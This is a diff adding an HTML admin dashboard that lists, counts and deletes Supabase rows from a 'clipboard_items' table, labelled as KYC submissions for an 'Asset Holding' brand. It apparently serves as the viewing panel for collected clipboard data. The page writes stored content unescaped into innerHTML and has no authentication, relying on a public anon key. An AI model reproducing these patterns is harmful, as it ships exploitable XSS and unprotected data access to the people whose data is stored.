@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard | Asset Holding</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../clipboard-supabase/config.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
+            background:
+                radial-gradient(circle at 15% 0, rgba(245, 199, 106, 0.18), transparent 55%),
+                radial-gradient(circle at 80% 0, rgba(117, 134, 255, 0.15), transparent 55%),
+                #050816;
+            color: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .header h1 {
+            font-size: 2rem;
+            color: #f5f5f5;
+        }
+
+        .header .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 20% 0, #ffe8a6, #f5c76a);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 4px 15px rgba(245, 199, 106, 0.4);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #111527;
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(245, 199, 106, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: #a3a3b2;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #f5c76a;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: radial-gradient(circle at 20% 0, #ffe8a6, #f5c76a);
+            color: #181818;
+            box-shadow: 0 4px 15px rgba(245, 199, 106, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(245, 199, 106, 0.5);
+        }
+
+        .btn-danger {
+            background: #ef4444;
+            color: #fff;
+        }
+
+        .btn-danger:hover {
+            background: #dc2626;
+        }
+
+        .table-container {
+            background: #111527;
+            border-radius: 12px;
+            border: 1px solid rgba(245, 199, 106, 0.2);
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .table-header {
+            padding: 20px;
+            border-bottom: 1px solid #262a3e;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .table-header h2 {
+            font-size: 1.2rem;
+            color: #f5f5f5;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: rgba(9, 12, 30, 0.96);
+        }
+
+        th {
+            padding: 15px;
+            text-align: left;
+            font-size: 0.85rem;
+            color: #a3a3b2;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            font-weight: 600;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #262a3e;
+            font-size: 0.9rem;
+            color: #f5f5f5;
+        }
+
+        tbody tr:hover {
+            background: rgba(245, 199, 106, 0.05);
+        }
+
+        .content-cell {
+            max-width: 400px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .content-cell:hover {
+            white-space: normal;
+            word-break: break-all;
+        }
+
+        .timestamp {
+            color: #a3a3b2;
+            font-size: 0.85rem;
+        }
+
+        .delete-btn {
+            padding: 6px 12px;
+            background: #ef4444;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s ease;
+        }
+
+        .delete-btn:hover {
+            background: #dc2626;
+        }
+
+        .empty-state {
+            padding: 60px 20px;
+            text-align: center;
+            color: #a3a3b2;
+        }
+
+        .empty-state-icon {
+            font-size: 4rem;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+
+        .loading {
+            padding: 40px;
+            text-align: center;
+            color: #a3a3b2;
+        }
+
+        .error {
+            background: rgba(220, 38, 38, 0.1);
+            border: 1px solid rgba(220, 38, 38, 0.3);
+            color: #ef4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="brand">
+                <div class="brand-icon">🔐</div>
+                <h1>Admin Dashboard</h1>
+            </div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-label">Total Submissions</div>
+                <div class="stat-value" id="total-count">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Today</div>
+                <div class="stat-value" id="today-count">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">This Week</div>
+                <div class="stat-value" id="week-count">0</div>
+            </div>
+        </div>
+
+        <div id="error-message" class="error" style="display: none;"></div>
+
+        <div class="controls">
+            <button class="btn btn-primary" onclick="loadData()">🔄 Refresh Data</button>
+            <button class="btn btn-danger" onclick="deleteAll()">🗑️ Delete All</button>
+        </div>
+
+        <div class="table-container">
+            <div class="table-header">
+                <h2>KYC Submissions</h2>
+                <span id="last-updated" class="timestamp"></span>
+            </div>
+            <div id="table-content">
+                <div class="loading">Loading data...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let supabase = null;
+
+        // Initialize Supabase
+        if (window.supabase && typeof SUPABASE_CONFIG !== 'undefined') {
+            supabase = window.supabase.createClient(
+                SUPABASE_CONFIG.url,
+                SUPABASE_CONFIG.anonKey
+            );
+        }
+
+        async function loadData() {
+            const tableContent = document.getElementById('table-content');
+            const errorMessage = document.getElementById('error-message');
+
+            if (!supabase) {
+                errorMessage.textContent = 'Supabase configuration not found. Please check config.js';
+                errorMessage.style.display = 'block';
+                tableContent.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div><p>Configuration Error</p></div>';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+            tableContent.innerHTML = '<div class="loading">Loading data...</div>';
+
+            try {
+                const { data, error } = await supabase
+                    .from('clipboard_items')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+
+                if (error) throw error;
+
+                // Update stats
+                document.getElementById('total-count').textContent = data.length;
+
+                const today = new Date().toDateString();
+                const todayCount = data.filter(item => new Date(item.created_at).toDateString() === today).length;
+                document.getElementById('today-count').textContent = todayCount;
+
+                const weekAgo = new Date();
+                weekAgo.setDate(weekAgo.getDate() - 7);
+                const weekCount = data.filter(item => new Date(item.created_at) >= weekAgo).length;
+                document.getElementById('week-count').textContent = weekCount;
+
+                // Update last updated time
+                document.getElementById('last-updated').textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
+
+                // Render table
+                if (data.length === 0) {
+                    tableContent.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📭</div><p>No submissions yet</p></div>';
+                } else {
+                    let tableHTML = `
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Content</th>
+                                    <th>Type</th>
+                                    <th>Submitted At</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                    `;
+
+                    data.forEach(item => {
+                        const date = new Date(item.created_at);
+                        tableHTML += `
+                            <tr>
+                                <td>${item.id}</td>
+                                <td class="content-cell" title="${item.content}">${item.content}</td>
+                                <td>${item.content_type || 'text'}</td>
+                                <td class="timestamp">${date.toLocaleString()}</td>
+                                <td>
+                                    <button class="delete-btn" onclick="deleteItem(${item.id})">Delete</button>
+                                </td>
+                            </tr>
+                        `;
+                    });
+
+                    tableHTML += '</tbody></table>';
+                    tableContent.innerHTML = tableHTML;
+                }
+            } catch (error) {
+                console.error('Error loading data:', error);
+                errorMessage.textContent = `Error: ${error.message}`;
+                errorMessage.style.display = 'block';
+                tableContent.innerHTML = '<div class="empty-state"><div class="empty-state-icon">❌</div><p>Failed to load data</p></div>';
+            }
+        }
+
+        async function deleteItem(id) {
+            if (!confirm('Are you sure you want to delete this item?')) return;
+
+            try {
+                const { error } = await supabase
+                    .from('clipboard_items')
+                    .delete()
+                    .eq('id', id);
+
+                if (error) throw error;
+
+                loadData();
+            } catch (error) {
+                console.error('Error deleting item:', error);
+                alert('Failed to delete item: ' + error.message);
+            }
+        }
+
+        async function deleteAll() {
+            if (!confirm('Are you sure you want to delete ALL submissions? This cannot be undone!')) return;
+            if (!confirm('This will permanently delete all data. Are you absolutely sure?')) return;
+
+            try {
+                const { error } = await supabase
+                    .from('clipboard_items')
+                    .delete()
+                    .neq('id', 0); // Delete all rows
+
+                if (error) throw error;
+
+                loadData();
+            } catch (error) {
+                console.error('Error deleting all items:', error);
+                alert('Failed to delete items: ' + error.message);
+            }
+        }
+
+        // Load data on page load
+        document.addEventListener('DOMContentLoaded', loadData);
+
+        // Auto-refresh every 30 seconds
+        setInterval(loadData, 30000);
+    </script>
+</body>
+
+</html>
